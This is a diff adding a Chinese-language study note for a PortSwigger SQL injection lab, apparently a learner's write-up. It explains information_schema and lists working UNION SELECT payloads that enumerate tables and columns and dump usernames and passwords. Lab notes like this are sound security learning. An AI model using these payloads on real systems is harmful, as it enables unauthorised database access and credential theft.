@@ -1,0 +1,24 @@
+靶场地址:https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
+
+=====新知识1=====
+前面的 products,users均属于业务表,存放具体的业务数据
+而非 Oracle数据库通常提供 *information_schema,
+它存放的是 *数据库的目录信息(元数据):
+=>
+1. 有哪些表            SELECT table_name FROM information_schema.tables
+2. 没张表有哪些列      SELECT column_name FROM information_schema.columns
+3. 列的数据类型是什么  SELECT column_name || '~' || data_type FROM information_schema
+对于 2.3;还可以在后面加 WHERE table_name=??? 来进一步缩小范围
+
+###
+进入靶场
+试出来有两个位置,且都是字符串类型的列
+=>
+'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--+   -> 图1,图2
+得到表名,搜user,admin等关键字,去找他们对应的列名
+=>
+'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='刚才确定的表名'--+
+随后发现账密相关的敏感信息  -> 图3,图4
+=>
+'+UNION+SELECT+username,password+FROM+'刚才确定的表名' -> 图5,图6
+solved
